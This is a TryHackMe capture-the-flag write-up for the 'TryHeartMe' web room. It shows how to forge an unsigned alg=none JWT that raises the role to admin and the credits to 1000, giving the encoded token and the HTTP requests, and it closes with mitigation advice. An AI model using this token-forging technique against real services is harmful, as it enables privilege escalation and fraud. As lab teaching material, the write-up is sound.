# TryHeartMe — Writeup

Room: TryHeartMe
Platform: TryHackMe
Category: Web / JWT Manipulation

## Objective

The challenge states:

> *"The TryHeartMe shop is open for business. Can you find a way to purchase the hidden “Valenflag” item?"*

Target application:

```
http://<TARGET_IP>:5000
```

The goal is to purchase a **hidden product called `Valenflag`**.

---

# 1. Initial Analysis

Opening the web application shows a **Valentine-themed shop** where users can buy items like:

* Rose Bouquet
* Valentine Gifts

Attempting to purchase an item sends the following request:

```
POST /buy/rose-bouquet HTTP/1.1
Host: <TARGET_IP>:5000
Cookie: tryheartme_jwt=<TOKEN>
```

The important element here is the cookie:

```
tryheartme_jwt=<JWT>
```

This indicates the application is using **JSON Web Tokens (JWT)** for authentication and user data.

---

# 2. Inspecting the JWT

Decoding the token reveals the payload:

```json
{
 "email": "user@gmail.com",
 "role": "user",
 "credits": 0,
 "iat": 1773107028,
 "theme": "valentine"
}
```

Important fields:

```
role
credits
```

Observations:

* The user has **0 credits**
* The **role is "user"**

This suggests the backend may rely on the token to determine permissions and purchasing power.

---

# 3. JWT Weakness

The token header:

```json
{
 "alg": "HS256",
 "typ": "JWT"
}
```

Many vulnerable implementations incorrectly trust client tokens or allow the algorithm to be changed.

A common attack is switching the algorithm to:

```
alg = none
```

If the server accepts unsigned tokens, we can forge our own.

---

# 4. Creating a Forged Token

We create a new token with elevated privileges.

## Header

```json
{"alg":"none","typ":"JWT"}
```

Base64 encode:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

---

## Payload (modified)

```json
{
 "email":"user@gmail.com",
 "role":"admin",
 "credits":1000,
 "iat":1773107028,
 "theme":"valentine"
}
```

Base64 encoded example:

```
eyJlbWFpbCI6InVzZXJAZ21haWwuY29tIiwicm9sZSI6ImFkbWluIiwiY3JlZGl0cyI6MTAwMCwiaWF0IjoxNzczMTA3MDI4LCJ0aGVtZSI6InZhbGVudGluZSJ9
```

---

## Final JWT

JWT format:

```
HEADER.PAYLOAD.SIGNATURE
```

Since `alg=none`, there is **no signature**:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InVzZXJAZ21haWwuY29tIiwicm9sZSI6ImFkbWluIiwiY3JlZGl0cyI6MTAwMCwiaWF0IjoxNzczMTA3MDI4LCJ0aGVtZSI6InZhbGVudGluZSJ9.
```

---

# 5. Using the Forged Token

Using **Burp Suite**:

1. Intercept a request
2. Modify the cookie

```
Cookie: tryheartme_jwt=<FORGED_TOKEN>
```

---

# 6. Purchasing the Hidden Item

Now that we have admin privileges and sufficient credits, we can attempt to buy the hidden item.

Send the request:

```
POST /buy/valenflag HTTP/1.1
Host: <TARGET_IP>:5000
Cookie: tryheartme_jwt=<FORGED_TOKEN>
```

The server accepts the request and returns the flag.

---

# 7. Vulnerability Explanation

This challenge demonstrates **JWT algorithm confusion / improper token validation**.

The server incorrectly accepts tokens where:

```
alg = none
```

This allows attackers to:

* Remove the signature
* Modify payload values
* Escalate privileges

---

# 8. Impact

An attacker could:

* Become admin
* Modify credits/balance
* Access hidden resources
* Purchase restricted items

---

# 9. Mitigation

Developers should:

* Reject `alg=none`
* Enforce a specific algorithm
* Verify JWT signatures correctly
* Avoid trusting client-controlled claims for authorization

---

# Tools Used

* Browser Developer Tools
* Burp Suite
* Base64 encoding
* Manual JWT forging

---

# Flag

```
THM{REDACTED}
```

---

# Skills Learned

* JWT decoding
* JWT forging
* Algorithm confusion attacks
* Web application request manipulation
